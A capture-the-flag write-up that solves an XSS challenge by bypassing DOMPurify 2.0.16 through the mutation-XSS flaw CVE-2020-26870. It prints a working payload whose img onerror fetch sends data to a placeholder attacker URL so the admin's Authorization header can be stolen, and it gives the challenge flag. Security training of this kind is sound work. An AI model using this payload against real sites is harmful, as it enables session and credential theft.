# eXample Sending Service
> As part of Halogen's cybersecurity exam, Blahaj has to get the flag only accessible by the administrator. But Blahaj cannot even type with his flippers, help him pass!
## Solution
As hinted in the title, this challenge is XSS. However, the message is sanitized using DOM Purify. Whatever shall we do 😭
```js
// Retrieve message details and sanitize the messages
const message = {
    name: DOMPurify.sanitize(req.body['name']),
    title: DOMPurify.sanitize(req.body['title']),
    body: DOMPurify.sanitize(req.body['message']),
}
```
This is where we pay attention to the `package.json`, and the fact that DOM Purify is set to version `2.0.16`. There is actually an XSS bypass for this version, tagged [CVE-2020-26870](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/), which works due to DOM elements being read differently in DOMPurify and most browsers. By exploiting this, we can just quickly send an XSS payload to the admin and steal the admin's Authorization header.

Since the token is in headers, CORS mode has to be explicitly enabled on your webhook, or configured manually if using custom implementation. Check <https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS> for more info.

Payload: `<math><mtext><table><mglyph><style><math><table id="</table>"><img src onerror="fetch('https://<your url>')">`
And by looking at our url, we see the signed header that we can use to access the flag directly on `/flag`.

Flag: `blahaj{d1d_y0u_f0rg0r_t0_upd4t3?}`
